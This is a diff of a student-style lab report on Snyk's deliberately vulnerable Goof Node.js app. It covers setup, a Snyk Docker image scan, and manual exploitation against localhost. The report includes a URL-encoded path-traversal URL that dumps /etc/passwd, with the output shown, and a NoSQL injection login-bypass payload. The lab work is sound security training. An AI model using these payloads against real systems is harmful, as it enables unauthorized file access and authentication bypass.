@@ -28,24 +28,119 @@ User inputs are directly processed without proper sanitization, allowing exploit
 Together, these issues enable attackers to bypass security controls, access sensitive data (like hidden flag files), and potentially execute arbitrary code, demonstrating the importance of secure coding practices and dependency management.
 
 ## 2. Steps Performed
-### Description
+### Setup Goof App
+#### Description
 
 In this step, I set up the Goof vulnerable application, which is an intentionally insecure Node.js app created by Snyk to demonstrate how common vulnerabilities in open-source dependencies can be found and fixed.
 
-### Commands Used
+#### Commands Used
 
 ```bash
 # Clone the Goof GitHub repository
 git clone https://github.com/snyk/nodejs-goof.git
+
 # Exploration
-cd goof
+cd nodejs-goof
 ls
-# Install Node.js dependencies
-npm install
 
 # Start the application
 docker-compose up --build
+
+# Web access
 http://localhost:3001
 ```
 
+### Docker Image Scanning
+
+#### Description
+
+In this step, I used the Snyk CLI to scan the Docker image built for the Goof application. The goal was to identify vulnerabilities in the base system libraries.
+
+#### Commands Used
+
+```bash
+# Step into the project directory
+cd nodejs-goof
+
+# Build the Docker image using docker-compose
+docker-compose build
+
+# List available Docker images to confirm the Goof image was built
+docker images
+
+# Run a Snyk scan on the Docker image
+snyk test --docker nodejs-goof_goof --file=Dockerfile
+```
+
+**Results**
+[Results](snyk-scan-results.txt)
+
+### Manual Exploits
+
+#### Description
+
+In this step, I tested the Goof application for a Local File Inclusion (LFI) vulnerability by attempting to access the system's `/etc/passwd` file through the browser. I also explored the provided PoC (proof-of-concept) exploits in the `exploits/` directory to understand how vulnerabilities can be reproduced through scripts.
+
+#### Test the App Locally: Access `/etc/passwd`
+
+##### Steps Performed
+
+1. Started the Goof app:
+```bash
+    docker-compose up --build
+```
+Opened the app in a browser at:
+
+cpp
+
+http://127.0.0.1:3001
+
+Manually crafted and accessed this LFI URL in the browser:
+
+http://127.0.0.1:3001/public/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd
+This is a URL-encoded version of:
+
+**Result**
+The /etc/passwd file contents were successfully displayed in the browser, confirming that the application is vulnerable to LFI.
+
+**Output:**
+```bash
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
+node:x:1000:1000::/home/node:/bin/bash
+```
+
+#### Explore PoCs in `exploits/` Directory
+To understand how the Goof application is vulnerable, I explored the provided (PoC) scripts located in the `exploits/` directory.
+
+I focused on the script `nosql-exploits.sh`, which contains multiple examples of NoSQL Injection payloads targeting the login functionality.
+
+##### Commands Used:
+
+```bash
+# Navigating to the exploits directory
+cd ~/nodejs-goof/exploits
+
+# Reading the PoC script to understand payloads
+cat nosql-exploits.sh
+
+# Manually running the NoSQL Injection payload (ns4)
+echo '{"username": "admin@snyk.io", "password": {"$gt": ""}}' | http --json http://localhost:3001/login -v
 
